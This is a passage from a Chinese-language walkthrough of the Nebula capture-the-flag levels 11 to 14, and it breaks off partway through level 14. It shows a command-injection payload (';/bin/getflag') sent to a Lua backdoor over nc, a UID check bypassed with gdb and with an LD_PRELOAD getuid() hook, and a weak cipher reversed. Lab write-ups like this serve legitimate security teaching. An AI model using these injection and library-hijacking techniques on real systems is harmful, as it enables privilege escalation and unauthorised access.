&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;编译并执行程序：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;level11&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;nebula&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="n"&gt;gcc&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;o&lt;/span&gt; &lt;span class="n"&gt;exp11&lt;/span&gt; &lt;span class="n"&gt;exp11&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;
&lt;span class="n"&gt;level11&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="nl"&gt;nebula&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="err"&gt;$&lt;/span&gt; &lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;exp11&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;~&lt;/span&gt;&lt;span class="n"&gt;flag11&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;flag11_old&lt;/span&gt;
&lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1024&lt;/span&gt;
&lt;span class="n"&gt;You&lt;/span&gt; &lt;span class="n"&gt;have&lt;/span&gt; &lt;span class="n"&gt;successfully&lt;/span&gt; &lt;span class="n"&gt;executed&lt;/span&gt; &lt;span class="n"&gt;getflag&lt;/span&gt; &lt;span class="n"&gt;on&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="n"&gt;target&lt;/span&gt; &lt;span class="n"&gt;account&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样两种方法就实现了。&lt;/p&gt;
&lt;p&gt;最后说一说为什么新的文件不能成功运行程序。反汇编一下flag11：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;   0x080489c7 &amp;lt;+0&amp;gt;:     push   %ebp
   0x080489c8 &amp;lt;+1&amp;gt;:     mov    %esp,%ebp
   0x080489ca &amp;lt;+3&amp;gt;:     sub    $0x28,%esp
   0x080489cd &amp;lt;+6&amp;gt;:     mov    0xc(%ebp),%eax
   0x080489d0 &amp;lt;+9&amp;gt;:     and    $0xff,%eax
   0x080489d5 &amp;lt;+14&amp;gt;:    mov    %eax,-0x10(%ebp)
   0x080489d8 &amp;lt;+17&amp;gt;:    movl   $0x0,-0xc(%ebp)
   0x080489df &amp;lt;+24&amp;gt;:    jmp    0x8048a0c &amp;lt;process+69&amp;gt;
   0x080489e1 &amp;lt;+26&amp;gt;:    mov    -0xc(%ebp),%eax
   0x080489e4 &amp;lt;+29&amp;gt;:    add    0x8(%ebp),%eax
   0x080489e7 &amp;lt;+32&amp;gt;:    mov    -0xc(%ebp),%edx
   0x080489ea &amp;lt;+35&amp;gt;:    add    0x8(%ebp),%edx
   0x080489ed &amp;lt;+38&amp;gt;:    movzbl (%edx),%edx
   0x080489f0 &amp;lt;+41&amp;gt;:    mov    %edx,%ecx
   0x080489f2 &amp;lt;+43&amp;gt;:    mov    -0x10(%ebp),%edx
   0x080489f5 &amp;lt;+46&amp;gt;:    xor    %ecx,%edx
   0x080489f7 &amp;lt;+48&amp;gt;:    mov    %dl,(%eax)
   0x080489f9 &amp;lt;+50&amp;gt;:    mov    -0xc(%ebp),%eax
   0x080489fc &amp;lt;+53&amp;gt;:    add    0x8(%ebp),%eax
   0x080489ff &amp;lt;+56&amp;gt;:    movzbl (%eax),%eax
   0x08048a02 &amp;lt;+59&amp;gt;:    movsbl %al,%eax
   0x08048a05 &amp;lt;+62&amp;gt;:    sub    %eax,-0x10(%ebp)
   0x08048a08 &amp;lt;+65&amp;gt;:    addl   $0x1,-0xc(%ebp)
   0x08048a0c &amp;lt;+69&amp;gt;:    mov    -0xc(%ebp),%eax
   0x08048a0f &amp;lt;+72&amp;gt;:    cmp    0xc(%ebp),%eax
   0x08048a12 &amp;lt;+75&amp;gt;:    jl     0x80489e1 &amp;lt;process+26&amp;gt;
   0x08048a14 &amp;lt;+77&amp;gt;:    call   0x8048700 &amp;lt;getgid@plt&amp;gt;
   0x08048a19 &amp;lt;+82&amp;gt;:    mov    %eax,(%esp)
   0x08048a1c &amp;lt;+85&amp;gt;:    call   0x8048690 &amp;lt;setgid@plt&amp;gt;
   0x08048a21 &amp;lt;+90&amp;gt;:    call   0x8048630 &amp;lt;getuid@plt&amp;gt;
   0x08048a26 &amp;lt;+95&amp;gt;:    mov    %eax,(%esp)
   0x08048a29 &amp;lt;+98&amp;gt;:    call   0x8048730 &amp;lt;setuid@plt&amp;gt;
   0x08048a2e &amp;lt;+103&amp;gt;:   mov    0x8(%ebp),%eax
   0x08048a31 &amp;lt;+106&amp;gt;:   mov    %eax,(%esp)
   0x08048a34 &amp;lt;+109&amp;gt;:   call   0x80486a0 &amp;lt;system@plt&amp;gt;
   0x08048a39 &amp;lt;+114&amp;gt;:   leave  
   0x08048a3a &amp;lt;+115&amp;gt;:   ret  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;上面是flag11中&lt;code&gt;process()&lt;/code&gt;完整的反汇编代码。可以看到0x08048a14开始有&lt;code&gt;setgid()&lt;/code&gt;和&lt;code&gt;setuid()&lt;/code&gt;的操作。这段反汇编如果翻译到C语言是这样的：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="p"&gt;...&lt;/span&gt;

  &lt;span class="n"&gt;setgid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getgid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
  &lt;span class="n"&gt;setuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;加入这两句之后，程序在执行&lt;code&gt;system()&lt;/code&gt;之前会强制还原uid和gid，因此程序本身的setuid权限失效，程序执行者永远是level11，而不是flag11，所以就不可能成功了。我这里也试验了用LD_PRELOAD的办法Hack掉&lt;code&gt;getuid()&lt;/code&gt;和&lt;code&gt;getpid()&lt;/code&gt;，但是很可惜方法无效，因为没有权限。&lt;/p&gt;
&lt;h1&gt;Nebula level12&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a backdoor process listening on port 50001.&lt;/p&gt;
&lt;p&gt;50001端口有个后门进程。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;socket&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;socket&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;assert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;socket&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;bind&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;50001&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;

&lt;span class="kr"&gt;function&lt;/span&gt; &lt;span class="nf"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
  &lt;span class="n"&gt;prog&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;io.popen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;echo &amp;quot;&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;..&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; | sha1sum&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;r&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;prog&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;read&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;*all&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;prog&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

  &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;string.sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

  &lt;span class="kr"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
&lt;span class="kr"&gt;end&lt;/span&gt;


&lt;span class="kr"&gt;while&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt; &lt;span class="kr"&gt;do&lt;/span&gt;
  &lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;server&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;accept&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Password: &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;settimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
  &lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;receive&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
  &lt;span class="kr"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;err&lt;/span&gt; &lt;span class="kr"&gt;then&lt;/span&gt;
    &lt;span class="nb"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;trying &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;..&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="c1"&gt;-- log from where ;\&lt;/span&gt;
    &lt;span class="kd"&gt;local&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="kr"&gt;if&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;~=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;4754a4f4bd5787accd33de887b9250a0691dd198&amp;quot;&lt;/span&gt; &lt;span class="kr"&gt;then&lt;/span&gt;
      &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Better luck next time&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kr"&gt;else&lt;/span&gt;
      &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Congrats, your token is 413**CARRIER LOST**&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="kr"&gt;end&lt;/span&gt;

  &lt;span class="kr"&gt;end&lt;/span&gt;

  &lt;span class="n"&gt;client&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="kr"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;一段Lua脚本，逻辑简单清晰。脚本语言的好处就是你不懂语法，也能猜出个大概。&lt;/p&gt;
&lt;p&gt;这段脚本监听50001端口，并需要连接后提交密码。显然我们最关心的是能不能运行shell脚本，因此定位到&lt;code&gt;hash()&lt;/code&gt;中的&lt;code&gt;popen()&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;直接截断看看可不可以：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level12@nebula:~$ nc &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1 &lt;span class="m"&gt;50001&lt;/span&gt;
Password: &lt;span class="p"&gt;;&lt;/span&gt;/bin/getflag &amp;gt; /tmp/flag12.txt
Better luck next &lt;span class="nb"&gt;time&lt;/span&gt;
level12@nebula:~$ cat /tmp/flag12.txt 
You have successfully executed getflag on a target account
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;得来全不费工夫！&lt;/p&gt;
&lt;h1&gt;Nebula level13&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a security check that prevents the program from continuing execution if the user invoking it does not match a specific user id.&lt;/p&gt;
&lt;p&gt;这是一个具有安全验证的程序，可以阻止非指定用户的执行。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="cp"&gt;#define FAKEUID 1000&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;envp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;FAKEUID&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Security failure detected. UID %d started us, we expect %d&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;FAKEUID&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;The system administrators will be notified of this violation&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;exit&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;EXIT_FAILURE&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="c1"&gt;// snip, sorry :)&lt;/span&gt;

  &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;your token is %s&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;token&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;程序在运行时会检测用户的UID是否为1000（通过&lt;code&gt;cat /etc/passwd | grep 1000&lt;/code&gt;发现uid=1000的用户为nebula）。&lt;/p&gt;
&lt;p&gt;这里可以想办法通过干预getuid()的返回值来得到目的，因此可以采用GDB对返回值作出修改：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gdb ./flag13
...
&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; disas main
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;反汇编main函数后发现：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Dump of assembler code for function main:
...
   0x080484ef &amp;lt;+43&amp;gt;:    call   0x80483c0 &amp;lt;getuid@plt&amp;gt;
   0x080484f4 &amp;lt;+48&amp;gt;:    cmp    $0x3e8,%eax
...
---Type &amp;lt;return&amp;gt; to continue, or q &amp;lt;return&amp;gt; to quit---q
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到，此处调用getuid()之后会把返回值放到eax中，因此只要在&lt;code&gt;0x080484f4&lt;/code&gt;处下断，让程序跑起来后修改eax为1000即可：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;(gdb) b *0x080484f4
Breakpoint 1 at 0x80484f4
(gdb) r
Starting program: /home/flag13/flag13 

Breakpoint 1, 0x080484f4 in main ()
(gdb) p $eax
$1 = 1014
(gdb) set $eax=1000
(gdb) p $eax
$2 = 1000
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 15690) exited with code 063]
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;得到密码&lt;code&gt;b705702b-76a8-42b0-8844-3adabbe5ac58&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当然此题还有一种解法，就是劫持getuid()函数。&lt;/p&gt;
&lt;p&gt;首先通过&lt;code&gt;file&lt;/code&gt;发现flag13调用了共享库，接着创建一个C文件：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;&lt;/span&gt;

&lt;span class="kt"&gt;uid_t&lt;/span&gt; &lt;span class="nf"&gt;getuid&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后编译并通过LD_PRELOAD环境变量替换掉真实的getuid()函数：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc -fPIC -shared -o preload.so preload.c
&lt;span class="nb"&gt;export&lt;/span&gt; &lt;span class="nv"&gt;LD_PRELOAD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/level13/preload.so
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;之后通过strace来调用，即可观察到结果：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level13@nebula:~$ strace /home/flag13/flag13
...
write&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;your token is b705702b-76a8-42b0&amp;quot;&lt;/span&gt;..., 51your token is b705702b-76a8-42b0-8844-3adabbe5ac58
&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;51&lt;/span&gt;
...
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;Nebula level14&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;This program resides in /home/flag14/flag14 . It encrypts input and writes it to standard output. An encrypted token file is also in that home directory, decrypt it :)&lt;/p&gt;
&lt;p&gt;程序加密了输入并写入标准输出，加密的token文件和程序都在flag14的家目录中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这题非常简单，破解加密算法，本来以为需要逆向，由于规律实在太简单，实验了几次就出来了：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;level14@nebula:/home/flag14$ ./flag14
./flag14
    -e  Encrypt input
level14@nebula:/home/flag14$ ./flag14 -e
&lt;span class="m"&gt;123456&lt;/span&gt;
&lt;span class="m"&gt;13579&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
level14@nebula:/home/flag14$ ./flag14 -e
&lt;span class="m"&gt;654321&lt;/span&gt;
&lt;span class="m"&gt;666666&lt;/span&gt;
level14@nebula:/home/flag14$ ./flag14 -e
&lt;span class="m"&gt;11111111111111111111111111&lt;/span&gt;
&lt;span class="m"&gt;123456789&lt;/span&gt;:&lt;span class="p"&gt;;&lt;/span&gt;&amp;lt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;gt;?@ABCDEFGHIJ$^C
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;可以看到，如果把输入数据看成一个数组，加密数据相当于输入数据加上数据的下标（从0开始），于是写出算法：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;123456&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;encrypt&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;

&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;len&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="p"&gt;)):&lt;/span&gt;
    &lt;span class="n"&gt;encrypt&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nb"&gt;chr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;ord&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plain&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;encrypt&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;因此可以写出逆运算并把token文件给解密：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;token&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/home/flag14/token&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
